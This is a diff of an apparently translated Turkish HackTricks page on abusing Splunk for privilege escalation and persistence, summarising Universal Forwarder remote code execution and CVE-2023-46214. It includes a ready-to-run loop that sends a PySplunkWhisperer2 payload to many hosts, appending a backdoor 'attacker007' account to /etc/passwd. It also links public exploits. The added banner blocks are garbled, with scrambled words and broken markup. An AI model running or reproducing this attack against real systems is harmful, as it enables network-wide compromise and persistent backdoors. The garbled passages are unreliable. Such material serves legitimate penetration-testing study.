@@ -1,76 +1,82 @@
-# Splunk LPE ve Kalıcılık
+# Splunk LPE ve Süreklilik
 
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
+<dotsilp>
 
-HackTricks'i desteklemenin diğer yolları:
+<oummpr>SupportHackTricks</smmay>
 
-* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-Bir makineyi **içeriden** veya **dışarıdan** **numaralandırırken** (port 8090) **Splunk çalışıyorsa**, şans eseri **geçerli kimlik bilgileri** biliyorsanız, Splunk hizmetini **kullanarak Splunk'ı çalıştıran kullanıcı olarak bir kabuk** çalıştırabilirsiniz. Eğer root çalışıyorsa, ayrıcalıkları root'a yükseltebilirsiniz.
+Eğer bir makineyi **içten** veya **dıştan** **numaralandırıyorsanız** ve **Splunk çalışıyorsa** (port 8090), şansınız varsa herhangi bir **geçerli kimlik bilgisi** biliyorsanız, **Splunk hizmetini kötüye kullanarak** Splunk'ı çalıştıran kullanıcı olarak **bir shell çalıştırabilirsiniz**. Eğer root çalışıyorsa, yetkileri root'a yükseltebilirsiniz.
 
-Ayrıca, **zaten root kullanıcısıysanız ve Splunk hizmeti yalnızca localhost'ta dinlemiyorsa**, Splunk hizmetinden **parola** dosyasını **çalabilir** ve parolaları **kırmaya** veya **yeni kimlik bilgileri eklemeye** çalışabilirsiniz. Ve ana bilgisayarda kalıcılığı sürdürebilirsiniz.
+Ayrıca eğer **zaten root iseniz ve Splunk hizmeti yalnızca localhost'ta dinlemiyorsa**, Splunk hizmetinden **şifre** dosyasını **çalıp** şifreleri **kırabilir** veya **yeni** kimlik bilgileri ekleyebilirsiniz. Ve host üzerinde sürekliliği sürdürebilirsiniz.
 
 Aşağıdaki ilk resimde, bir Splunkd web sayfasının nasıl göründüğünü görebilirsiniz.
 
+## Splunk Universal Forwarder Agent İstismar Özeti
 
+Daha fazla detay için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) gönderisini kontrol edin. Bu sadece bir özet:
 
-## Splunk Universal Forwarder Agent Exploit Özeti
-
-Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) gönderisine bakın. Bu sadece bir özet:
-
-**Exploit Genel Bakış:**
-Splunk Universal Forwarder Agent (UF) hedef alan bir exploit, ajan parolasına sahip saldırganların ajanı çalıştıran sistemlerde keyfi kod çalıştırmasına izin vererek, tüm bir ağı tehlikeye atabilir.
+**İstismar Genel Görünümü:**
+Splunk Universal Forwarder Agent (UF) hedef alan bir istismar, ajan şifresine sahip saldırganların ajanı çalıştıran sistemlerde rastgele kod çalıştırmasına olanak tanır ve potansiyel olarak tüm bir ağı tehlikeye atabilir.
 
 **Ana Noktalar:**
-- UF ajanı, gelen bağlantıları veya kodun otantikliğini doğrulamaz, bu da yetkisiz kod çalıştırmasına karşı savunmasız hale getirir.
-- Ortak parola edinme yöntemleri, ağ dizinlerinde, dosya paylaşımlarında veya iç belgelerde bulunmalarını içerir.
-- Başarılı bir saldırı, kompromize edilen ana bilgisayarlarda SYSTEM veya root düzeyinde erişim, veri sızdırma ve daha fazla ağ sızma ile sonuçlanabilir.
+- UF ajanı gelen bağlantıları veya kodun doğruluğunu doğrulamaz, bu da yetkisiz kod çalıştırmaya karşı savunmasız hale getirir.
+- Yaygın şifre edinme yöntemleri, bunları ağ dizinlerinde, dosya paylaşımlarında veya iç belgelerde bulmayı içerir.
+- Başarılı bir istismar, tehlikeye atılan hostlarda SYSTEM veya root düzeyinde erişim, veri sızdırma ve daha fazla ağ sızması ile sonuçlanabilir.
 
-**Exploit Yürütme:**
-1. Saldırgan UF ajan parolasını elde eder.
-2. Splunk API'sini kullanarak komut veya betikleri ajanlara gönderir.
-3. Olası eylemler arasında dosya çıkarma, kullanıcı hesabı manipülasyonu ve sistem tehlikeye atma bulunur.
+**İstismar Uygulaması:**
+1. Saldırgan UF ajan şifresini elde eder.
+2. Ajanlara komut veya betik göndermek için Splunk API'sini kullanır.
+3. Olası eylemler arasında dosya çıkarma, kullanıcı hesabı manipülasyonu ve sistemin tehlikeye atılması yer alır.
 
-**Etki:**
-- Her bir ana bilgisayarda SYSTEM/root düzeyinde izinlerle tam ağ tehlikeye atma.
-- Algılanmayı önlemek için günlüğü devre dışı bırakma potansiyeli.
-- Arka kapı veya fidye yazılımı kurulumu.
+**Etkisi:**
+- Her hostta SYSTEM/root düzeyinde izinlerle tam ağ tehlikesi.
+- Tespiti önlemek için günlük kaydını devre dışı bırakma potansiyeli.
+- Arka kapılar veya fidye yazılımlarının kurulumu.
 
-**Exploit için Örnek Komut:**
+**İstismar için Örnek Komut:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-**Kullanılabilir halka açık zafiyetler:**
+**Kullanılabilir kamu exploitleri:**
 * https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 * https://www.exploit-db.com/exploits/46238
 * https://www.exploit-db.com/exploits/46487
 
 
-## Splunk Sorgularını Kötüye Kullanma
+## Splunk Sorgularının Suistimali
 
-**Daha fazla ayrıntı için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) adresindeki yazıyı kontrol edin.**
+**Daha fazla detay için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) gönderisini kontrol edin**
 
-**CVE-2023-46214**, bir **script**'in **`$SPLUNK_HOME/bin/scripts`** dizinine yüklenmesine izin veriyordu ve ardından **`|runshellscript script_name.sh`** arama sorgusu kullanarak orada depolanan **script**'in **çalıştırılabilmesini** açıkladı.
+{% h*nt styCe="Vacceas" %}
+AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
+<dtil>
 
-<details>
+<ummr>SupportHackTricks</smmay>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-HackTricks'i desteklemenin diğer yolları:
-
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
